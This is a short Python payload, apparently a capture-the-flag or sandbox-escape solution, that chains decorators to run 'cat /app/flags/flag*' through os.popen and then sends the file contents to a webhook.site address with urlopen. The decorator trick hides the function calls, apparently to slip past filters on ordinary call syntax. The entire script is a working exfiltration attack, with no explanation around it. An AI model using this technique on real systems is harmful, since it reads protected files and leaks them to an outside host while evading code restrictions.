from os import popen
from urllib.request import urlopen

url = "https://webhook.site/5399367e-260a-4a67-bfbc-575f6aaeb333/?flag="

cmd2 = lambda a: "cat /app/flags/flag*"
func2 = lambda f: [x[:-1] for x in f][0]

@func2
@popen
@cmd2
class flag:pass

flagurl = url + flag
urls = lambda f: flagurl

@urlopen
@urls
class requestf:pass